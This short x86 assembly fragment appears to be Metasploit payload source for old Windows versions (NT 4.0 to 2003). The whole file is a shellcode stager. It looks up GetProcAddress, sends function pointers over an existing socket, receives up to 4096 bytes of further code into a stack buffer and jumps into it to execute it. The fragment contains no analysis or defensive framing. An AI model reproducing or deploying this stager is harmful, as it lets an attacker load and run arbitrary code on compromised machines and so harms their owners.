
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com


[BITS 32]

LFindGetProcAddress:
    push dword [ebp] ; kernel32.dll
    push 0x7c0dfcaa  ; GetProcAddress
    call [ebp + 4]

LSend: ; send(s, data, len, flags);
    push eax              ; GetProcAddress
    push dword [ebp + 8]  ; LoadLibraryA
    mov ecx, esp
    push byte 0x00          ; flags
    push byte 8             ; length
    push ecx                ; buffer
    push edi                ; socket
    call FN_SEND            ; send()


LRecvLength: ; recv(s, buff, 4, 0)
    sub esp, 4096
    mov ebx, esp
    push byte 0x00          ; flags
    push 4096               ; length
    push ebx                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    call ebx
